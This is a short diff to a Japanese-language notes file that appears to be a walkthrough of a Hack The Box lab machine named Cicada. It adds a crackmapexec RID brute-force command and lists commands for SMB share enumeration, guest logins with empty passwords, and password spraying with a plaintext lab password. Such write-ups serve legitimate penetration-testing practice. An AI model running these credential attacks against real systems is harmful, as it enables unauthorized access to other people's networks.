@@ -27,6 +27,8 @@ poetry run crackmapexec -h
 `poetry run crackmapexec smb cicada.htb --shares`
 #### guest等のデフォルトで使用されている可能性のあるクレデンシャルの調査
 `poetry run crackmapexec smb cicada.htb -u 'guest' -p '' --shares`
+#### RID ブルートフォース
+`poetry run crackmapexec smb 10.10.11.35 -u anonymous -p '' --rid-brute`
 #### txtでリバースブルートフォース
 `poetry run crackmapexec smb cicada.htb -u ../users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'`
 #### 取得したクレデンシャルで再度調査
